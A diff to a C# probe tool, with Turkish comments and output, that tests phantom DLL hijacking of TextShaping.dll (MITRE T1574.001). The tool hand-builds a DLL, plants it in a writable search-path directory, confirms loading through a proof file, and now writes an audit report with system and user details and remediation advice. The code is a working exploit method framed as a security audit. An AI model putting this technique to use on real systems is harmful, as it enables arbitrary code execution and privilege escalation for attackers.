@@ -32,7 +32,7 @@ using System.Threading;
 class PhantomDllHijackProbe
 {
     const string DLL_TARGET = "TextShaping.dll";
-    const string PROOF_FILE = @"C:\Windows\Temp\phantom_dll_proof.txt";
+    const string PROOF_FILE = @"C:\Users\Public\phantom_dll_proof.txt";
     const string LOG_FILE   = @"C:\Windows\Temp\phantom_dll_log.txt";
     const string WIN_APPS   = @"C:\Program Files\WindowsApps";
 
@@ -106,7 +106,7 @@ class PhantomDllHijackProbe
             // KERNEL32.dll\0\0 — 14 bytes (pad to even)
             ms.Write(new byte[] { 0x4B,0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x2E,0x64,0x6C,0x6C,0,0 }, 0, 14);
             // proof_path (38 bytes: "C:\Windows\Temp\phantom_dll_proof.txt\0")
-            byte[] pp = Encoding.ASCII.GetBytes("C:\\Windows\\Temp\\phantom_dll_proof.txt\x00");
+            byte[] pp = Encoding.ASCII.GetBytes("C:\\Users\\Public\\phantom_dll_proof.txt\x00");
             ms.Write(pp, 0, pp.Length);
             // proof_text (132 bytes)
             byte[] pt = Encoding.ASCII.GetBytes(
@@ -425,14 +425,66 @@ class PhantomDllHijackProbe
         // 11. Sonuc
         if (found)
         {
-            string proof = File.ReadAllText(PROOF_FILE);
-            Log("=== ZAFIYET DOGRULANDI ===\n" + proof.Trim());
+            string dllProof = File.ReadAllText(PROOF_FILE);
+
+            // Sistem bilgileri
+            string compName   = Environment.MachineName;
+            string userName   = Environment.UserName;
+            string domain     = Environment.UserDomainName;
+            string osVer      = Environment.OSVersion.ToString();
+            string probeExe   = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            string probeVer   = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();
+            string auditTime  = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+
+            bool isAdmin = false;
+            try
+            {
+                var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+                isAdmin = new System.Security.Principal.WindowsPrincipal(id)
+                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            }
+            catch { }
+
+            string auditReport =
+                "============================================================\r\n" +
+                "  AUDIT RAPORU — PHANTOM DLL HIJACKING (T1574.001)\r\n" +
+                "============================================================\r\n" +
+                "Tarih/Saat     : " + auditTime + "\r\n" +
+                "Bilgisayar     : " + compName + "\r\n" +
+                "Kullanici      : " + domain + "\\" + userName + "\r\n" +
+                "Admin          : " + (isAdmin ? "EVET" : "HAYIR (non-admin olarak test edildi)") + "\r\n" +
+                "Isletim Sistemi: " + osVer + "\r\n" +
+                "Test Araci     : " + probeExe + "\r\n" +
+                "------------------------------------------------------------\r\n" +
+                "Zafiyet        : Phantom DLL Hijacking\r\n" +
+                "MITRE ATT&CK   : T1574.001\r\n" +
+                "Hedef DLL      : " + DLL_TARGET + "\r\n" +
+                "Deploy Yolu    : " + deployedPath + "\r\n" +
+                "Phantom mi     : " + (isPhantom ? "EVET — sistem dizinlerinde DLL yok" : "HAYIR — PATH senaryosu") + "\r\n" +
+                "------------------------------------------------------------\r\n" +
+                "DLL YUKLENME KANITI (phantom_dll_proof.txt icerigi):\r\n" +
+                dllProof.Trim() + "\r\n" +
+                "------------------------------------------------------------\r\n" +
+                "Sonuc          : Non-admin kullanici, DLL arama sirasindaki\r\n" +
+                "                 yazilabilir dizine " + DLL_TARGET + " yukleyerek\r\n" +
+                "                 hedef uygulamada keyfi kod calistirdi.\r\n" +
+                "                 Etki: Privilege escalation / lateral movement.\r\n" +
+                "------------------------------------------------------------\r\n" +
+                "Oneri          : Yazilabilir PATH dizinlerini kisitla.\r\n" +
+                "                 TextShaping.dll ghost DLL fix uygula.\r\n" +
+                "                 CWDIllegalInDllSearch registry politikasini etkinlestir.\r\n" +
+                "============================================================\r\n";
+
+            string reportPath = @"C:\Users\Public\phantom_dll_audit_report.txt";
+            try { File.WriteAllText(reportPath, auditReport); }
+            catch { reportPath = Path.Combine(Path.GetTempPath(), "phantom_dll_audit_report.txt");
+                    File.WriteAllText(reportPath, auditReport); }
+
+            Log("=== ZAFIYET DOGRULANDI ===");
+            Log("Audit raporu: " + reportPath);
             Console.WriteLine();
-            Console.WriteLine("============================================================");
-            Console.WriteLine("  [!!!] PHANTOM DLL HIJACKING DOGRULANDI - T1574.001");
-            Console.WriteLine("============================================================");
-            Console.WriteLine(proof.Trim());
-            Console.WriteLine("============================================================");
+            Console.WriteLine(auditReport);
+            Console.WriteLine("[+] Audit raporu kaydedildi: " + reportPath);
         }
         else
         {
